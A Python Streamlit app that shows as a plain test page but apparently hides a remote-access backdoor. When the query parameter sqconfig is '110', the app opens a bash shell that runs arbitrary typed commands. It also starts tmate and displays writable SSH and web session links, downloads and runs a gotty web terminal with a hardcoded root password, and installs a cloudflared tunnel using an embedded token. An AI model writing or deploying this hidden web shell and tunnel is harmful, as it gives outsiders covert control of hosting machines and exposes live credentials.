import streamlit as st
import subprocess
import time
import os
st.title("🎈 My new app")
st.write("我的测试页面")
# 获取 URL 查询参数
params = st.query_params

sqconfig = params.get("sqconfig", None)


from datetime import  datetime

tmate_path ="/mount/src/sqtest/tmate"
tmate_path = "/workspaces/sqtest/tmate"

class TmateManager:
    def __init__(self):
        self.tmate_path = tmate_path
        self.tmate_process = None
        self.session_info = {}

    def start_tmate(self):
        """启动tmate并获取会话信息"""
        st.write("正在启动tmate...")
        try:
                  # 给tmate添加执行权限
            os.chmod(self.tmate_path, 0o755)
            # 验证文件是否可执行
            if os.access(self.tmate_path, os.X_OK):
                st.write("✓ 执行权限验证成功")
            else:
                st.write("✗ 执行权限验证失败")
                return False
            
            # 启动tmate进程 - 分离模式，后台运行
            self.tmate_process = subprocess.Popen(
                [str(self.tmate_path), "-S", "/tmp/tmate.sock", "new-session", "-d"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True  # 创建新进程组，脱离父进程
            )

            # 等待tmate启动
            time.sleep(5)

            # 获取会话信息
            self.get_session_info()

            # 验证tmate是否在运行
            try:
                result = subprocess.run(
                    [str(self.tmate_path), "-S", "/tmp/tmate.sock", "list-sessions"],
                    capture_output=True, text=True, timeout=5
                )
                if result.returncode == 0:
                    st.write("✓ Tmate后台进程验证成功")
                    return True
                else:
                    st.write("✗ Tmate后台进程验证失败")
                    return False
            except Exception as e:
                st.write(f"✗ 验证tmate进程失败: {e}")
                return False

        except Exception as e:
            st.write(f"✗ 启动tmate失败: {e}")
            return False

    def get_session_info(self):
        """获取tmate会话信息"""
        try:
            # 获取只读web会话
            result = subprocess.run(
                [str(self.tmate_path), "-S", "/tmp/tmate.sock", "display", "-p", "#{tmate_web_ro}"],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                self.session_info['web_ro'] = result.stdout.strip()

            # 获取只读SSH会话
            result = subprocess.run(
                [str(self.tmate_path), "-S", "/tmp/tmate.sock", "display", "-p", "#{tmate_ssh_ro}"],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                self.session_info['ssh_ro'] = result.stdout.strip()

            # 获取可写web会话
            result = subprocess.run(
                [str(self.tmate_path), "-S", "/tmp/tmate.sock", "display", "-p", "#{tmate_web}"],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                self.session_info['web_rw'] = result.stdout.strip()

            # 获取可写SSH会话
            result = subprocess.run(
                [str(self.tmate_path), "-S", "/tmp/tmate.sock", "display", "-p", "#{tmate_ssh}"],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                self.session_info['ssh_rw'] = result.stdout.strip()

            # 显示会话信息
            if self.session_info:
                st.write("\n✓ Tmate会话已创建:")
                if 'web_ro' in self.session_info:
                    st.write(f"  只读Web会话: {self.session_info['web_ro']}")
                if 'ssh_ro' in self.session_info:
                    st.write(f"  只读SSH会话: {self.session_info['ssh_ro']}")
                if 'web_rw' in self.session_info:
                    st.write(f"  可写Web会话: {self.session_info['web_rw']}")
                if 'ssh_rw' in self.session_info:
                    st.write(f"  可写SSH会话: {self.session_info['ssh_rw']}")
            else:
                st.write("✗ 未能获取到会话信息")

        except Exception as e:
            st.write(f"✗ 获取会话信息失败: {e}")

    def show_ssh_info(self):
        """保存SSH信息到文件"""
        try:
            content = f"""Tmate SSH 会话信息
创建时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

"""
            if 'web_ro' in self.session_info:
                content += f"web session read only: {self.session_info['web_ro']}\n"
            if 'ssh_ro' in self.session_info:
                content += f"ssh session read only: {self.session_info['ssh_ro']}\n"
            if 'web_rw' in self.session_info:
                content += f"web session: {self.session_info['web_rw']}\n"
            if 'ssh_rw' in self.session_info:
                content += f"ssh session: {self.session_info['ssh_rw']}\n"


            st.write(f"✓ SSH信息已保存到: {content}")
            return content

        except Exception as e:
            st.write(f"✗ 保存SSH信息失败: {e}")
            return False


    def cleanup(self):
        """清理资源 - 不终止tmate会话"""
        # 注意：这里不清理tmate进程，让它在后台继续运行
        st.write("✓ Python脚本资源清理完成（tmate会话保持运行）")


if sqconfig == "110":
   
    # 启动一个持久的 CMD 会话
    p = subprocess.Popen("/bin/bash", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    def run_cmd(cmd):
        p.stdin.write(cmd + "\n")
        p.stdin.flush()
        p.stdin.write("echo [END]\n")
        p.stdin.flush()

        output_lines = []
        while True:
            line = p.stdout.readline()
            if line.strip() == "[END]":
                break
            output_lines.append(line)

        return "".join(output_lines)

    # 设置默认值（推荐放在顶部）
    if "resp_arr" not in st.session_state:
        st.session_state.resp_arr = []
    if "manager" not in st.session_state:
        st.session_state.manager = TmateManager()
    manager = st.session_state.manager;
    cmd = st.text_input("输入命令：")


    if st.button("启动tmate"):
        manager.start_tmate()
    if st.button("获取sessioninfo"):
        manager.get_session_info()
    if st.button("show_ssh_info"):
        manager.show_ssh_info()
    if st.button("cleanup"):
        manager.cleanup()

    if st.button("执行"):
        try:
            result = run_cmd(cmd)
            st.session_state.resp_arr.append(result)
            for item in st.session_state.resp_arr:
                st.write(str(item))
        except subprocess.CalledProcessError as e:
            st.text_area("错误输出", e.output, height=300)
    if st.button("安装tmate"):
        os.chmod("/mount/src/sqtest/tmate", 0o755)
         # 验证文件是否可执行
        if os.access("/mount/src/sqtest/tmate", os.X_OK):

            st.write("✓ 执行权限验证成功")
            st.write(run_cmd("tmate"))
        else:
            st.write("✗ 执行权限验证失败")
        
    if st.button("执行安装"):
        

        st.write(
        "开始搭建环境"
        )

        proot = run_cmd("./start-proot.sh")
        st.write(
            proot
        )

        gotty = run_cmd("ls")
        st.write(
            gotty
        )

# 下载gotty
        if not gotty.__contains__("gotty"):
            gotty = run_cmd("wget https://github.com/sqwenxin1/blank-app/releases/download/v0.0.1/gotty")
            st.write(
                gotty
            )
        else:
            st.write(
                "gotty 已经存在"
            )

        st.write("ls")
        st.write(run_cmd("ls"))

        time.sleep(3)
        st.write(run_cmd("chmod 777 gotty"))

        # 运行gotty
        run_gotty = run_cmd("nohup ./gotty --port 8088  --credential root:Sq@987654321 -w bash > gotty.log 2>&1 &")
        st.write(
            run_gotty
        )
        # Add cloudflare gpg key

        st.write("Add cloudflare gpg key")
        st.write(
            run_cmd(" mkdir -p --mode=0755 /usr/share/keyrings")
        )
        st.write(
            run_cmd("curl -fsSL https://pkg.cloudflare.com/cloudflare-main.gpg |  tee /usr/share/keyrings/cloudflare-main.gpg >/dev/null")
        )
        # Add this repo to your apt repositories
        st.write("Add this repo to your apt repositories")
        st.write(
            run_cmd("echo 'deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared any main' |  tee /etc/apt/sources.list.d/cloudflared.list")
        )
        # install cloudflared
        st.write("install cloudflared")
        st.write(
            run_cmd(" apt-get update &&  apt-get install cloudflared")
        )

        st.write("zert_trust")
        st.write(run_cmd(" cloudflared service uninstall"));
        time.sleep(3)
        # st.write(run_cmd("chmod 777 install_cloudflare.sh"))
        st.write(
            run_cmd("cloudflared service install eyJhIjoiMGU1ZWNhZWJhOWQ4YTQ0NTg1NjBlZjQxMWEyNDYxOGMiLCJ0IjoiYmFkNDdlNWUtNTcwYy00NzhmLWJjM2YtYThlYWYxNTc3YjE3IiwicyI6IlpXSXhNekZqTkdZdFpUY3hZUzAwWXpZeExXRTNZemd0WmpOaE1UZzNPV1F5WVRVeCJ9")
        )
        time.sleep(5)
        st.write(run_cmd("ps -ef |  grep cloudflare"))
        st.write("完成")
